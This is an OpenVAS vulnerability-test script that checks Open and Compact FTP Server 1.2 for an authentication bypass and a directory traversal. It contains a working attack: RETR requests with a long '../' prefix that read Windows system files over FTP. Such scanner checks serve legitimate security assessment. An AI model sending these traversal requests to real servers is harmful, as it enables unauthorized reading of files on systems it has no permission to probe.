###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_n_compact_ftpd_server_mult_vun.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803733");
  script_version("$Revision: 13499 $");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-08-12 11:33:28 +0530 (Mon, 12 Aug 2013)");
  script_name("Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/open-ftpd/detected", "Host/runs_windows");

  script_xref(name:"URL", value:"http://1337day.com/exploit/21078");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080072");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122747");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/open-and-compact-ftp-server-12-bypass-directory-traversal");

  script_tag(name:"summary", value:"The host is running Open and Compact FTPD server and is prone to
  authentication bypass and directory traversal vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack request and check whether it
  is able to read the system file or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Multiple flaws due to,

  - Access not being restricted to various FTP commands before a user is
  properly authenticated.

  - An Error in handling certain requests.");

  script_tag(name:"affected", value:"Open and Compact FTP Server version 1.2 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute FTP commands
  without any authentication and read arbitrary files on the affected application.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_ftp_port( default:21 );
banner = get_ftp_banner( port:port );
if( ! banner || "Gabriel's FTP Server" >!< banner )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

send( socket:soc, data:string( "USER ", user, "\r\n" ) );
buf = recv( socket:soc, length:512 );

send( socket:soc, data:string( "PASS ", pass, "\r\n" ) );
buf = recv( socket:soc, length:512 );

if( "230 User" >!< buf && "logged in" >!< buf ) {
  ftp_close( socket:soc );
  exit( 0 );
}

port2 = ftp_get_pasv_port( socket:soc );
if( ! port2 ) {
  ftp_close( socket:soc );
  exit( 0 );
}

soc2 = open_sock_tcp( port2, transport:get_port_transport( port ) );
if( ! soc2 ) {
  ftp_close( socket:soc );
  exit( 0 );
}

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = "../../../../../../../../../../../../../../../../" + file;

  req = string( "RETR ", file );
  send( socket:soc, data:string( req, "\r\n" ) );

  res = ftp_recv_data( socket:soc2 );

  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
    ftp_close( socket:soc );
    close( soc2 );
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

ftp_close( socket:soc );
close( soc2 );
exit( 0 );